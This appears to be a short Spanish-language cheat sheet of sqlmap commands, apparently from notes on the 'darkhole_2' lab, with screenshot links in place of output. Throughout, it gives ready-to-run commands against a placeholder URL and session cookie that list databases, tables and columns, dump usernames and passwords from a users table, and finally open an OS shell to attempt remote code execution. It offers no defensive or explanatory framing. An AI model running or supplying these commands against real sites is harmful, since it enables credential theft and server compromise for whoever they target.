Sintaxis simple

```bash
sqlmap -u 'https://google.com?id=1' --dbs --cookie "PHPSESSID=12345" --dbms mysql --batch
```

![[Pasted image 20251202151832.png|300]]

```bash
sqlmap -u 'https://google.com?id=1' --cookie "PHPSESSID=12345" --dbms mysql --batch -D darkhole_2 --tables
```

![[Pasted image 20251202152020.png|300]]

```bash
sqlmap -u 'https://google.com?id=1' --cookie "PHPSESSID=12345" --dbms mysql --batch -D darkhole_2 -T users --columns
```

![[Pasted image 20251202152136.png|400]]

```bash
sqlmap -u 'https://google.com?id=1' --cookie "PHPSESSID=12345" --dbms mysql --batch -D darkhole_2 -T users -C username,password --dump
```

![[Pasted image 20251202152425.png|350]]

```bash
sqlmap -u 'https://google.com?id=1' --cookie "PHPSESSID=12345" --os-shell --batch
```

Intenta crear RCE